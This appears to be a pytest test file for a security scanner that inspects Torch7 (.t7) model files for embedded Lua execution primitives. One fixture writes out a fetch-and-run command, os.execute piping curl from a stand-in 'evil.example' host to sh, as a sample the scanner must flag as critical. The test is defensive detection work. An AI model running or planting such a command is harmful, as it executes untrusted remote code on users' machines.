"""Tests for Torch7 scanner support."""

from __future__ import annotations

from pathlib import Path

from modelaudit import core
from modelaudit.scanners.base import CheckStatus, IssueSeverity
from modelaudit.scanners.torch7_scanner import Torch7Scanner


def _write_torch7_file(tmp_path: Path, payload: bytes, filename: str = "model.t7") -> Path:
    path = tmp_path / filename
    path.write_bytes(payload)
    return path


def test_can_handle_valid_torch7_file(tmp_path: Path) -> None:
    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential model_name=resnet\n"
    path = _write_torch7_file(tmp_path, payload)

    assert Torch7Scanner.can_handle(str(path))


def test_can_handle_rejects_non_torch7_content(tmp_path: Path) -> None:
    path = _write_torch7_file(tmp_path, b"this is not a torch7 file", filename="fake.t7")

    assert not Torch7Scanner.can_handle(str(path))


def test_scan_detects_lua_execution_with_network_context(tmp_path: Path) -> None:
    payload = (
        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )
    path = _write_torch7_file(tmp_path, payload, filename="malicious.t7")

    result = Torch7Scanner().scan(str(path))
    execution_findings = [
        check
        for check in result.checks
        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
    ]
    assert len(execution_findings) == 1
    assert execution_findings[0].severity == IssueSeverity.CRITICAL


def test_scan_handles_corrupt_file_gracefully(tmp_path: Path) -> None:
    path = _write_torch7_file(tmp_path, b"NOT7", filename="corrupt.t7")

    result = Torch7Scanner().scan(str(path))
    header_failures = [check for check in result.checks if check.name == "Torch7 Header Signature"]
    assert len(header_failures) == 1
    assert header_failures[0].status == CheckStatus.FAILED
    assert result.success is False


def test_regression_torch7_routes_to_dedicated_scanner(tmp_path: Path) -> None:
    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
    path = _write_torch7_file(tmp_path, payload, filename="route.t7")

    result = core.scan_file(str(path))
    assert result.scanner_name == "torch7"
    assert result.scanner_name != "unknown"


def test_false_positive_execute_word_without_call_not_critical(tmp_path: Path) -> None:
    payload = (
        b"T7\x00\x00torch.FloatTensor nn.Sequential\nlabel=execute_mode_fast\ndescription=network_ready_classifier\n"
    )
    path = _write_torch7_file(tmp_path, payload, filename="labels.t7")

    result = Torch7Scanner().scan(str(path))
    critical_checks = [check for check in result.checks if check.severity == IssueSeverity.CRITICAL]
    assert len(critical_checks) == 0


def test_false_positive_numeric_tensor_blob_not_flagged_as_exec(tmp_path: Path) -> None:
    numeric_blob = b"".join(int(i).to_bytes(2, "little", signed=False) for i in range(64))
    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\n" + numeric_blob
    path = _write_torch7_file(tmp_path, payload, filename="tensor.th")

    result = Torch7Scanner().scan(str(path))
    exec_failures = [
        check
        for check in result.checks
        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
    ]
    assert len(exec_failures) == 0
